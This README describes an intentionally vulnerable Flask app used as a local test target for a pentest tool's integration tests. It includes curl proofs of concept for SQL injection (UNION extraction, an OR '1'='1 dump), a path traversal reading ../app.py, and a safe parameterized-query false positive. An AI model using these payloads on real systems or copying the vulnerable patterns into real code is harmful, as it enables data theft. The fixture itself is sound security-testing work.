# vuln-flask-app — ZeroKit E2E Pentest Target

**Purpose:** A deliberately vulnerable Flask web application used as a controlled test fixture for ZeroKit's end-to-end integration tests. Contains real exploitable vulnerabilities by design.

> ⚠️ **WARNING:** Do NOT deploy this outside of local Docker testing. The vulnerabilities are intentional and real.

## Build & Run

```bash
cd tests/fixtures/vuln-flask-app
docker-compose up --build
```

The app will be available at `http://localhost:5000`.

## Vulnerabilities

### 1. SQL Injection (CWE-89)

- **Route:** `GET /user?name=<input>`
- **Root cause:** String concatenation in `cursor.execute(f"SELECT * FROM users WHERE name='{name}'")`
- **Technique:** UNION-based extraction (SQLite has no `SLEEP()`, so time-based blind SQLi is not available)

**PoC:**

```bash
# Normal usage
curl "http://localhost:5000/user?name=alice"
# Expected: [{"id":1,"name":"alice","email":"alice@example.com"}]

# UNION extraction — retrieve SQLite version
curl "http://localhost:5000/user?name=' UNION SELECT sqlite_version(), NULL, NULL--"
# Expected: [{"id":"3.x.x","name":null,"email":null}]

# Dump all users
curl "http://localhost:5000/user?name=' OR '1'='1"
# Expected: all rows from the users table
```

### 2. Path Traversal (CWE-22)

- **Route:** `GET /file?path=<input>`
- **Root cause:** Unsanitized `os.path.join(BASE_DIR, user_input)` followed by open/read
- **BASE_DIR:** `data/` subdirectory containing `welcome.txt`

**PoC:**

```bash
# Normal usage
curl "http://localhost:5000/file?path=welcome.txt"
# Expected: "Welcome to the vuln-flask-app test fixture."

# Path traversal — read the app source code
curl "http://localhost:5000/file?path=../app.py"
# Expected: full contents of app.py
```

### 3. False Positive — Parameterized Query (Safe)

- **Route:** `GET /item?id=<input>`
- **Implementation:** `cursor.execute("SELECT * FROM items WHERE id=?", (item_id,))`
- **Why scanners flag it:** Semgrep and similar tools may pattern-match on `cursor.execute` with a variable argument, but the `?` placeholder ensures proper parameterization.
- **Why it's safe:** The database driver handles escaping; user input never enters the query string directly.

**PoC (injection fails):**

```bash
# Normal usage
curl "http://localhost:5000/item?id=1"
# Expected: [{"id":1,"name":"Widget","price":9.99}]

# Attempted injection — returns empty, not all rows
curl "http://localhost:5000/item?id=1' OR '1'='1"
# Expected: [] (empty array — injection has no effect)
```

## SQLite PoC Note

SQLite does not support `SLEEP()` or `BENCHMARK()` functions, so time-based blind SQL injection is not feasible against this target. Use UNION-based extraction instead (see CWE-89 PoC above).

## Network

The `docker-compose.yml` creates a network named `pentest-net` (literal name, no Compose project prefix). This is required by `run_poc.py` which references the network by this exact name.
